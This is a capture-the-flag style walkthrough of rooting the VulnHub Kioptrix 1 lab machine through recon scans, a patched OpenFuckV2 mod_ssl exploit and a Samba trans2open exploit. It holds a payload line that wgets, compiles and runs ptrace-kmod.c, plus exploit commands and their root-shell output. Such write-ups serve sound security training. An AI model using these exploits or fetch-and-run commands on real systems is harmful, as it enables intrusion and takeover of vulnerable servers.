# Recon
## TCP/80 - HTTP
### FFUF/FEROX
```
┌──(root💀kali)-[~/vulnHub/kioptrix1]
└─# ffuf -u http://192.168.1.104/FUZZ -w /usr/share/wordlists/dirb/common.txt -e ".html,.txt,.php" -fw 20

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.104/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 20
________________________________________________

                        [Status: 200, Size: 2890, Words: 453, Lines: 87]
index.html              [Status: 200, Size: 2890, Words: 453, Lines: 87]
index.html              [Status: 200, Size: 2890, Words: 453, Lines: 87]
manual                  [Status: 301, Size: 294, Words: 19, Lines: 10]
mrtg                    [Status: 301, Size: 292, Words: 19, Lines: 10]
test.php                [Status: 200, Size: 27, Words: 2, Lines: 6]
usage                   [Status: 301, Size: 293, Words: 19, Lines: 10]
:: Progress: [18460/18460] :: Job [1/1] :: 6129 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```
- `test.php`

### Nikto
```
┌──(root💀kali)-[~/vulnHub/kioptrix1]
└─# nikto -ask=no -h http://192.168.1.104:80 2>&1 | tee "/root/vulnHub/kioptrix1/192.168.1.104/scans/tcp80/tcp_80_http_nikto.txt"
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.104
+ Target Hostname:    192.168.1.104
+ Target Port:        80
+ Start Time:         2022-01-23 15:08:22 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Thu Sep  6 11:12:46 2001
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).
+ OSVDB-3268: /manual/: Directory indexing found.
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /test.php: This might be interesting...
+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ /shell?cat+/etc/hosts: A backdoor was identified.
+ 8724 requests: 0 error(s) and 30 item(s) reported on remote host
+ End Time:           2022-01-23 15:08:47 (GMT8) (25 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
- `mod_ssl 2.8.7` and lower are **vulnerable to a remote buffer overflow** which may allow a remote shell
- wordpress is a false positive

## TCP/443 - HTTPS
### FFUF
- The same as TCP/80
### Nikto
- The same as TCP/80


## TCP/139,445 - SMB
### Enum4linux
```
 ------------------------------------------
  OS Information via RPC for 192.168.1.104   
 ------------------------------------------
[*] Enumerating via unauthenticated SMB session on 139/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
	OS: Linux/Unix (Samba 2.2.1a)
	OS version: '4.5'
	OS release: not supported
	OS build: not supported
	Native OS: Unix
	Native LAN manager: Samba 2.2.1a
	Platform id: '500'
	Server type: '0x9a03'
	Server type string: Wk Sv PrQ Unx NT SNT Samba Server
```
- Samba 2.2.1a

### SMBMap + Crackmapexec
```
┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104]
└─# crackmapexec smb $ip -u '' -p '' --shares

┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104]
└─# smbmap -H $ip
[!] 445 not open on 192.168.1.104...
```

# Initial Foothold
## TCP/80 - HTTP - No Exploits Found
1. View enumerated directories
	 - `test.php`
		![](images/Pasted%20image%2020220123151154.png)
		- php code does not work
	- `manual, mrtg, usage`
		- Redirected to localhost

	
## TCP/443 - HTTPS - No Exploits Found
1. View enumerated directories
	 - `test.php`
		![](images/Pasted%20image%2020220123151154.png)
		- php code does not work
	- `manual, mrtg, usage`
		- Redirected to localhost
2. Search for `mod_ssl 2.8.7` exploits
	```
	┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104/exploit/mod_ssl]
	└─# searchsploit mod_ssl 2.8
	Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow               unix/remote/21671.c
	Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow               unix/remote/21671.c
	Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)         unix/remote/764.c
	
	┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104/exploit/mod_ssl]
	└─# gcc 764.c -o exploit
	764.c:644:31: error: ‘SSL2_MAX_CONNECTION_ID_LENGTH’ undeclared here (not in a function); did you mean ‘SSL_MAX_SSL_SESSION_ID_LENGTH’?
	```
	- However, none of them work w/o any modification
3. Fixing the exploit
	- [Guide I followed](https://monkeydouy.medium.com/how-to-compile-openfuckv2-c-69e457b4a1d1)
	1. Line 24: Add
		```
		#include <openssl/rc4.h>
		#include <openssl/md5.h>

		#define SSL2_MT_ERROR 0
		#define SSL2_MT_CLIENT_FINISHED 3
		#define SSL2_MT_SERVER_HELLO 4
		#define SSL2_MT_SERVER_VERIFY 5
		#define SSL2_MT_SERVER_FINISHED 6
		#define SSL2_MAX_CONNECTION_ID_LENGTH 16
		```
	2. Line 673: Replace COMMAND 2 
		```
		#define COMMAND2 "unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"
		``` 
	3. Line 970: Add 
		```
		const unsigned char *p, *end;
		```
	4. Line 972: Remove 
		```
		unsigned char *p, *end;
		``` 
	5. Line 1079: Replace
		```
		if (EVP_PKEY_get1_RSA(pkey) == NULL) {
		```
	6. Line 1085: Replace
		```
		encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);
		```
	7. Install
		```
		apt-get install libssl-dev
		```
	8. Compile
		```
		gcc -o 764 764.c -lcrypto
		```

1. Run the exploit
	- NMAP Scan 
		```
		80/tcp   open  http        syn-ack ttl 64 Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
		|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
		| http-methods: 
		|   Supported Methods: GET HEAD OPTIONS TRACE
		|_  Potentially risky methods: TRACE
		```
		- Red-Hat/Linux
		- Apache/1.3.20
	- Exploit
		```
		┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104/exploit/mod_ssl]
		└─# gcc -o 764 764.c -lcrypto

		┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104/exploit/mod_ssl]
		└─# ./764 | grep "RedHat" | grep "1.3.20"
			0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
			0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2

		┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104/exploit/mod_ssl]
		└─# ./764 0x6b $ip 443 -c 50
		Connection... 50 of 50
		Establishing SSL connection
		cipher: 0x4043808c   ciphers: 0x80f8258
		Ready to send shellcode
		Spawning shell...
		bash: no job control in this shell
		bash-2.05$ 
		ace-kmod.c; rm ptrace-kmod.c; ./p;  wget 192.168.1.1/ptrace-kmod.c; gcc -o p ptr 
		--04:45:09--  http://192.168.1.1/ptrace-kmod.c
				   => `ptrace-kmod.c'
		Connecting to 192.168.1.1:80... connected!
		HTTP request sent, awaiting response... 200 OK
		Length: 3,921 [text/x-csrc]

			0K ...                                                   100% @   3.74 MB/s

		04:45:09 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]

		[+] Attached to 19340
		[+] Waiting for signal
		[+] Signal caught
		[+] Shellcode placed at 0x4001189d
		[+] Now wait for suid shell...
		whoami
		root

		```
		![](images/Pasted%20image%2020220123164436.png)




## TCP/139,445 - SMB - Samba 2.2.1a Exploit
1. Search for `Samba 2.2.1a` exploits
	```
	┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104/exploit]
	└─# searchsploit samba 2.2
	----------------------------------------------------------------------------------- 
	Exploit Title                    			   	  |  Path								
	----------------------------------------------------------------------------------- 
	Samba < 2.2.8 (Linux/BSD) - Remote Code Execution | multiple/remote/10.c
	-----------------------------------------------------------------------------------
	```
2. Compile Exploit & Run
	```
	┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104/exploit/samba]
	└─# searchsploit -m multiple/remote/10.c
	  Exploit: Samba < 2.2.8 (Linux/BSD) - Remote Code Execution
		  URL: https://www.exploit-db.com/exploits/10
		 Path: /usr/share/exploitdb/exploits/multiple/remote/10.c
	File Type: C source, ASCII text

	Copied to: /root/vulnHub/kioptrix1/192.168.1.104/exploit/samba/10.c


	┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104/exploit/samba]
	└─# gcc 10.c -o exploit
	┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104/exploit/samba]
	└─# ./exploit -b 0 -c 192.168.1.1 $ip
	samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
	--------------------------------------------------------------
	+ Bruteforce mode. (Linux)
	+ Host is running samba.
	+ Worked!
	--------------------------------------------------------------
	*** JE MOET JE MUIL HOUWE
	Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
	uid=0(root) gid=0(root) groups=99(nobody)
	whoami
	```
	![](images/Pasted%20image%2020220123164752.png)





# Privilege Escalation
## Root - Via
- Already root by running the service exploits


---
Tags: #tcp/139-445-smb/exploit 

---